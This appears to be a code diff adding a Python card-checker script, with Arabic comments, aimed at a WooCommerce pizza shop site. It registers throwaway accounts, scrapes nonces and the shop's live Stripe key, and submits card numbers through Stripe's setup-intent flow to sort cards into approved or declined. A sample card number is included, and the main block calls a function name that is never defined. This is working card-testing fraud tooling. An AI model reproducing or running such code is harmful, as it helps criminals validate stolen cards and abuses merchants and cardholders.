@@ -1,0 +1,205 @@
+import requests
+import re
+import random
+import string
+import uuid
+import time
+from user_agent import generate_user_agent
+
+def generate_random_email():
+    """توليد بريد إلكتروني عشوائي للتسجيل"""
+    name = ''.join(random.choices(string.ascii_lowercase, k=10))
+    number = ''.join(random.choices(string.digits, k=4))
+    return f"{name}{number}@gmail.com"
+
+def stripe3(card_data):
+    """
+    فحص بطاقة (Stripe Auth) على موقع 400pizzahallgreen.co
+    card_data: رقم|شهر|سنة|cvv
+    """
+    try:
+        # ===== تجزئة البطاقة =====
+        card_data = card_data.strip()
+        n = card_data.split("|")[0]
+        mm = card_data.split("|")[1]
+        yy = card_data.split("|")[2]
+        cvc = card_data.split("|")[3].strip()
+
+        # تنسيق السنة
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        if len(yy) == 2:
+            yy_full = f"20{yy}"
+        else:
+            yy_full = yy
+
+        # إزالة أي مسافات من رقم البطاقة
+        n = n.replace(" ", "")
+
+        # بدء جلسة
+        r = requests.Session()
+        user_agent = generate_user_agent()
+        site_url = "https://400pizzahallgreen.co"
+
+        # ===== 1. فتح صفحة الحساب لاستخراج register nonce =====
+        print("\n[1/6] فتح صفحة الحساب...")
+        headers = {
+            'authority': '400pizzahallgreen.co',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+            'user-agent': user_agent,
+        }
+        response = r.get(f'{site_url}/my-account/', headers=headers)
+        print(f"    ✅ HTTP {response.status_code}")
+
+        # استخراج register nonce
+        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
+        if not reg_nonce:
+            return "❌ Register nonce not found"
+        reg_nonce = reg_nonce.group(1)
+        print(f"    🔑 Register nonce: {reg_nonce}")
+
+        # ===== 2. تسجيل حساب جديد =====
+        print("\n[2/6] تسجيل حساب جديد...")
+        email = generate_random_email()
+        password = f"Pass{random.randint(1000,9999)}"
+
+        headers = {
+            'authority': '400pizzahallgreen.co',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': site_url,
+            'referer': f'{site_url}/my-account/',
+            'user-agent': user_agent,
+        }
+
+        data = {
+            'email': email,
+            'password': password,
+            'woocommerce-register-nonce': reg_nonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+
+        response = r.post(f'{site_url}/my-account/', headers=headers, data=data)
+        print(f"    ✅ تم التسجيل: {email} / {password}")
+
+        # ===== 3. فتح صفحة إضافة البطاقة =====
+        print("\n[3/6] فتح صفحة إضافة البطاقة...")
+        headers = {
+            'authority': '400pizzahallgreen.co',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+            'user-agent': user_agent,
+        }
+        response = r.get(f'{site_url}/my-account/add-payment-method/', headers=headers)
+        print(f"    ✅ HTTP {response.status_code}")
+
+        # استخراج Stripe Publishable Key
+        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
+        if not pk_live:
+            return "❌ Stripe key not found"
+        pk_live = pk_live.group(1)
+        print(f"    🔑 Stripe key found")
+
+        # استخراج AJAX nonce (createAndConfirmSetupIntentNonce)
+        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
+        if not ajax_nonce:
+            return "❌ AJAX nonce not found"
+        ajax_nonce = ajax_nonce.group(1)
+        print(f"    🔑 AJAX nonce: {ajax_nonce}")
+
+        # ===== 4. جلب معرفات Stripe (guid, muid, sid) =====
+        print("\n[4/6] جلب معرفات Stripe...")
+        headers = {
+            'authority': 'm.stripe.com',
+            'accept': '*/*',
+            'content-type': 'text/plain;charset=UTF-8',
+            'origin': 'https://m.stripe.network',
+            'referer': 'https://m.stripe.network/',
+            'user-agent': user_agent,
+        }
+        response = r.post('https://m.stripe.com/6', headers=headers, data='')
+        try:
+            detet = response.json()
+            guid = detet.get('guid', str(uuid.uuid4()))
+            muid = detet.get('muid', str(uuid.uuid4()))
+            sid = detet.get('sid', str(uuid.uuid4()))
+            print(f"    ✅ GUID, MUID, SID obtained")
+        except:
+            guid = str(uuid.uuid4())
+            muid = str(uuid.uuid4())
+            sid = str(uuid.uuid4())
+            print(f"    ⚠️ تم إنشاء معرفات وهمية")
+
+        # ===== 5. إرسال البطاقة إلى Stripe API =====
+        print("\n[5/6] إرسال البطاقة إلى Stripe...")
+        client_session_id = str(uuid.uuid4())
+        elements_session_config_id = str(uuid.uuid4())
+        time_on_page = random.randint(10000, 99999)
+
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': user_agent,
+        }
+
+        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=GB&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2025-09-30.clover'
+
+        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)
+
+        try:
+            payment_id = response.json()['id']
+            print(f"    ✅ Payment Method ID: {payment_id}")
+        except Exception as e:
+            return f"❌ فشل إنشاء وسيلة الدفع: {str(e)}"
+
+        # ===== 6. تأكيد Setup Intent =====
+        print("\n[6/6] تأكيد Setup Intent...")
+        headers = {
+            'authority': '400pizzahallgreen.co',
+            'accept': '*/*',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': site_url,
+            'referer': f'{site_url}/my-account/add-payment-method/',
+            'user-agent': user_agent,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        data = {
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': payment_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }
+
+        response = r.post(f'{site_url}/wp-admin/admin-ajax.php', data=data, headers=headers)
+        text = response.text
+
+        # ===== تحليل النتيجة =====
+        print("\n" + "="*60)
+        if '"success":true' in text:
+            print("🎉 النتيجة: ✅ APPROVED")
+            return '✅ Approved'
+        elif 'card was declined' in text.lower():
+            print("❌ النتيجة: ❌ DECLINED")
+            return '❌ Declined'
+        elif 'duplicate card exists' in text.lower():
+            print("✅ النتيجة: ✅ APPROVED (DUPLICATE)")
+            return '✅ Approved (Duplicate)'
+        else:
+            print(f"❌ النتيجة: ❌ DECLINED")
+            return '❌ Declined'
+
+    except Exception as e:
+        return f'❌ خطأ في السكريبت: {str(e)}'
+
+
+if __name__ == '__main__':
+    # اختبار السكريبت
+    test_card = "5294158321468738|12|2026|904"
+    print(f"\n🚀 اختبار فحص بطاقة على 400pizzahallgreen.co")
+    result = stripe_auth_400pizza(test_card)
+    print(f"\n📇 Card: {test_card}")
+    print(f"📊 Result: {result}")
